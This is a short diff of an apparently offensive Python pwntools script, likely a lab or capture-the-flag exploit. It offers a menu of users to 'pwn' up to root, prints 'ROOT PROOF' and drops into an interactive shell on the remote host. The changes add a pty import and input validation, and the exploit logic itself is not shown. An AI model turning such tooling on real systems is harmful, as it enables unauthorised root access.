@@ -1,6 +1,6 @@
 from pwn import *
 import netifaces as ni
-import urllib3, sys,argparse, subprocess, time
+import urllib3, sys,argparse, subprocess,pty, time
 urllib3.disable_warnings()
 warnings.filterwarnings("ignore", category=UserWarning, module="pwntools")
 
@@ -67,7 +67,7 @@ def exploit(RHOST, user):
         print("\n\t ROOT PROOF")
         root_proof = p.recv(1024).decode()
         print(root_proof)
-        p.interactive()
+        p.interactive()                                                             
     else:
         print("[-] The Entered option is incorrect")
         sys.exit(-2)
@@ -91,8 +91,12 @@ def main():
     3. Root
     ''')
     user = input("[+] Enter the user you want to pwn : ")
-    user = int(user)
-    exploit(RHOST, user)
+    user = int(user.strip())
+    if user > 0 and user <= 3:
+        exploit(RHOST, user)
+    else:
+        print("[-] Invalid Options!")
+
     
 if __name__ == "__main__":
     main()
